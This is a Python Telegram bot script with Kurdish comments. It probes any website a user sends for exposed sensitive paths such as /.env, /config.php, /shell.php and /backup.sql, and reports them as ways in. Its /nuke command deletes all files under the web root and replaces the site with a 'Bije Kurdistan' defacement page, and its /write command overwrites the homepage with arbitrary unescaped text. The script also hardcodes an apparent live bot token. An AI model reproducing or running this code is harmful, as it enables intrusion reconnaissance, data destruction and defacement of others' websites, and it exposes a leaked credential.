import requests
import os
import shutil
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# تۆکینی بۆتەکەی تۆ
TOKEN = '8701131068:AAE6I4gfU7nyLVjU1vu_4GBUy5A4_2s6Wvs'
# ناونیشانی فۆڵدەری وێبسایت لەسەر سێرڤەر (ئەگەر بۆتەکە لەوێ بوو)
WEBSITE_PATH = '/var/www/html/'

# --- فەرمانی پشکنینی لینک لە دوورەوە ---
async def scan_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text.strip()
    if not url.startswith('http'):
        url = 'http://' + url

    await update.message.reply_text(f"🔍 هەوڵ دەدەم دەستم بگات بە وێبسایتی: {url}")
    
    paths_to_check = ['/admin', '/config.php', '/.env', '/wp-login.php', '/shell.php', '/backup.sql']
    found = []

    for p in paths_to_check:
        target = url.rstrip('/') + p
        try:
            r = requests.get(target, timeout=5)
            if r.status_code == 200:
                found.append(f"🔓 دۆزرایەوە: {target}")
        except:
            continue
    
    if found:
        await update.message.reply_text("✅ ئەم دەرگایانەم دۆزییەوە بۆ چوونە ژوورەوە:\n" + "\n".join(found))
    else:
        await update.message.reply_text("❌ وێبسایتەکە لە دەرەوە زۆر قایمە، ناتوانم ڕاستەوخۆ بچمە ژوورەوە.")

# --- فەرمانی سڕینەوەی هەموو شتێک (ئەگەر لەناو سێرڤەر بێت) ---
async def nuke(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⚠️ خەریکم هەموو شتێک دەسڕمەوە و دەیگۆڕم بۆ Bije Kurdistan...")
    try:
        if os.path.exists(WEBSITE_PATH):
            for filename in os.listdir(WEBSITE_PATH):
                file_path = os.path.join(WEBSITE_PATH, filename)
                if os.path.isfile(file_path): os.unlink(file_path)
                elif os.path.isdir(file_path): shutil.rmtree(file_path)
            
            with open(os.path.join(WEBSITE_PATH, 'index.html'), 'w') as f:
                f.write("<h1 style='text-align:center;'>Bije Kurdistan</h1>")
            await update.message.reply_text("🔥 وێبسایتەکە پاک کرایەوە و تەنها 'Bije Kurdistan' ماوەتەوە.")
    except Exception as e:
        await update.message.reply_text(f"❌ هەڵە: {str(e)}")

# --- فەرمانی نووسین لەناو وێبسایت ---
async def write(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = ' '.join(context.args)
    if not text:
        await update.message.reply_text("بنووسە: /write [دەقەکە]")
        return
    try:
        with open(os.path.join(WEBSITE_PATH, 'index.html'), 'w') as f:
            f.write(f"<h1 style='text-align:center;'>{text}</h1>")
        await update.message.reply_text("✅ دەقەکە لە وێبسایتەکە نووسرا.")
    except Exception as e:
        await update.message.reply_text(f"❌ هەڵە: {str(e)}")

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()
    
    # ناساندنی فەرمانەکان
    app.add_handler(CommandHandler("nuke", nuke))
    app.add_handler(CommandHandler("write", write))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), scan_link))
    
    print("Cyber AI Bot is Running...")
    app.run_polling()
